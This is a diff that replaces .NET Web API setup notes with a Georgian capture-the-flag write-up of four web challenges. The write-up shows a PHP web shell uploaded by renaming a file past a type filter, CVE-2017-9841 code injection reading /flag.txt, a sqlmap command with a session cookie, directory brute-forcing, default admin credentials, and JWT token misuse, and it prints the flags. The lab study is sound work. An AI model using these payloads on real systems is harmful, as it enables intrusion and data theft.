@@ -1,25 +1,105 @@
-WebApiSolution
-│
-├── Domain
-│   └── Models
-│       ├── Product.cs
-│       └── Supplier.cs
-│
-├── Data
-│   └── AppDbContext.cs
-│
-├── Services
-│   └── InventoryService.cs
-│
-└── WebApiApp
-    ├── Controllers
-    │   └── InventoryController.cs
-    └── Program.cs
+***Bolt
 
-Create a new project -> ASP.NET Core Web API -> Create
-Right-click the solution -> Add → New Project -> Class Library (.NET) -> Create
-Right-click Data -> Add → Project Reference -> Domain -> OK
-Right-click Services -> Add → Project Reference -> Domain -> OK
-Right-click WebApiApp -> Add → Project Reference -> Domain/Services/Data -> OK
-Right-click Data -> Manage NuGet Packages -> Browse -> Microsoft.EntityFrameworkCore
-Right-click WebApiApp -> Manage NuGet Packages -> Microsoft.EntityFrameworkCore -> Microsoft.EntityFrameworkCore.InMemory
+პირველად ეტაპზე ვამჩნევთ sample site-ს, რომელზეც თავდაპირველად ვეცდებით
+ვიპოვოთ source, ამისთვის საიტის ლინკის დასაწყისში მივუთითებთ “view-source:”
+
+დავაკვირდეთ ტექსტს: This website is <a href='http://bolt.cm' target='_blank' title='Sophisticated,
+lightweight & simple CMS'>Built with Bolt</a>. ვეცადოთ საიტის ლინკში ჩავამატოთ bolt
+შემდეგნაირად: /bolt/login
+
+შედეგად გავედით login ველზე, სადაც მისათითებელია user/password. Page Source-ის
+გადავლის შემდეგ, Wild Guess პრინციპით ვეცდებით შესვლას. საბოლოოდ, იმუშავა
+კომბინაციამ admin/password:
+
+მალევე შევამჩნევთ რომ საიტზე შეგვიძლია ფაილების ატვირთვა file management ტაბის
+გამოყენებით:
+
+ვცადოთ რამე მავნე .php ფაილის ატვირთვა, შემდეგი ფორმატით:
+
+<?php echo system($_GET[‘cmd’]);?>
+ეს მცდელობა უშედეგოა, საიტი არ გვაძლევს ამ ტიპის ფაილის ატვირთვის უფლებას,
+თუმცა ნებადართული ფაილის ტიპებში ვამჩნევთ .html ფორმატის ფაილებს. ვცადოთ
+ავტვირთოთ .html ფაილის ფორმატით.
+
+ეს მცდელობა წარმატებულია. მომდევნო ეტაპზე ვცადოთ შევცვალოთ ფაილის ტიპი
+rename ფუნქციით და ამით გვერდი ავუაროთ ატვირთვის შეზღუდვას. ამით .php ტიპის
+მავნე ფაილი ატვირთულია. ვცადოთ მისი გახსნა და შემდეგ ლინკის ველის გადაკეთება
+სასურველი შედეგის მისაღებად. პირველ ეტაპზე ლინკში დავამატებთ cmd=id:
+
+მეორე ეტაპზე ვცადოთ ls ფუნქციის გამოყენებით ფაილების ჩამონათვალის მიღება:
+
+საბოლოო ეტაპზე გამოვიყენოთ cat ბრძანება და მოვძებნოთ flag.txt:
+
+მცდელობა წარმატებულია, შედეგად Flag 01:
+CTF{b12e3b34c581d4f3c66c00cc7f8dabec8838dab0acf26c2cfbe2f7d291326f75}
+
+*** PHP-Unit
+
+საწყის ეტაპზე ვამჩნევთ რაღაც placeholder სურათს შემდეგი ტექსტით:
+
+ვცადოთ ამ საიტის dirsearch-ით ენუმერაცია და დავაკვირდეთ შედეგებს. ვატარებთ
+შემდეგ ბრძანებას:
+./dirsearch.py -u http://34.179.196.37:31652 -w ./db/dicc.txt
+ამოღებული ფაილებიდან შევამოწმოთ composer.json რომელშიც ვერსიაა 5.6.2
+გადავამოწმოთ exploit database, რომელიც გვეუბნება რომ 5.6.3 ვერსიამდე იგი
+მოწყვლადია code injection-ის მიმართ (CVE-2017-9841)
+საბოლოოდ გავხსნათ Burp Suite, გავატაროთ code injection საშუალებით ბრძანება:
+<?php system(‘cat /flag.txt’)?>
+ბრძანების წარმატებულად გატარების შედეგად მივიღეთ Flag 02:
+CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}
+
+*** Schematics
+
+IP-ზე გადასვლისას ვამჩნევთ სტანდარტულ შესასვლელ ველებს. გვერდის დანარჩენი
+ნაწილი ცარიელია. პირველ რიგში, უნდა ვცადოთ რეგისტრაციის მოპოვება, რის
+შედეგადაც შევძლებთ შესვლას. ამისთვის გამოვიყენოთ dirsearch და ვცადოთ ვიპოვოთ
+სარეგისტრაციო ლინკი.
+
+შედეგად ვპოულობთ register.php, საიდანაც დავიწყებთ საიტზე რეგისტრაციას და
+გავცდებით შესასვლელ ველებს.
+
+წარმატებით შევედით, რის შემდეგაც ვამჩნევთ საძიებო ველს, რომელშიც თუ „%“
+სიმბოლოს ჩავწერთ, არსებული პროდუქტების სრულ სიას მივაგნებთ:
+
+ვცადოთ საიტის გატარება burpsuite-ზე და დავაკვირდეთ შედეგს:
+
+მოცემულის ფონზე, შეგვიძლია დავასკვნათ, რომ ამ საიტს გააჩნია მოწყვლადობა SQL
+Injection-ის მიმართ. ამიტომ, kali-ზე sqlmap-ის გამოყენებით გავატაროთ მიღებული cookie
+(PHPSESSID=bf9dec96e8c4a6ff82c757486171cbb2) და ვცადოთ ამ გზით მივიღოთ დროშა.
+სრული ბრძანებაა:
+
+sqlmap --cookie="PHPSESSID=bf9dec96e8c4a6ff82c757486171cbb2" -u
+http://34.159.85.111:30306/index.php --forms --columns --random-agent
+
+დროშა: CTF{1nformat1on_sch3ma_c4n_cont41n_us3ful_d4t4}
+
+***Authorize
+
+საიტზე შესვლისას ვხედავთ მხოლოდ ტექსტურ ველებს, ინტერაქცია შეზღუდულია:
+
+ამისთვის ვცადოთ dirsearch რათა ვიპოვოთ საიტზე არსებული სხვა დირექტორიები.
+./dirsearch.py -u http://34.159.85.111:32272/
+
+გავუყვეთ მიღებულ შედეგებს და გადავიდეთ პირველივე auth გვერდზე, რომელიც
+სავარაუდოდ მოგვცემს შესვლის საშუალებას.
+
+მივიღეთ რაღაც ტიპის შეცდომა, რაც გვეუბნება რომ საიტზე წვდომისთვის ვერ
+გამოვიყენებთ GET ტიპის მოთხოვნებს. ამიტომ, კვლავ მივმართოთ BurpSuite-ს და
+ვცადოთ POST მოთხოვნის გატარება:
+
+შედეგად შევამჩნევთ JWT პარამეტრებს, რაც მიუთითებს რომ საიტზე შესვლა
+შესაძლებელია. გადავიდეთ სხვა დირექტორიაში და ვცადოთ ამ პარამეტრების ამოღება.
+
+მიღებული შედეგი გავატაროთ BurpSuite-ით, POST მოთხოვნაში:
+Connection-type: application/json
+
+{
+    "username": "admin",
+    "password": "admin"
+}
+
+ამით მივიღებთ access tokens. საბოლოოდ გადავიდეთ secrets დირექტორიაში, და გამოვიყენოთ ეს ტოკენი curl-ის ბრძანებაში:
+
+curl -H “Authorization: JWT &lt;Token&gt;” http://34.159.85.111:32272/secrets
+
+მივიღეთ დროშა: CTF{5b7cc033a48df4958a076286420b4a91631defa16be26409afbdf1e053367b21}
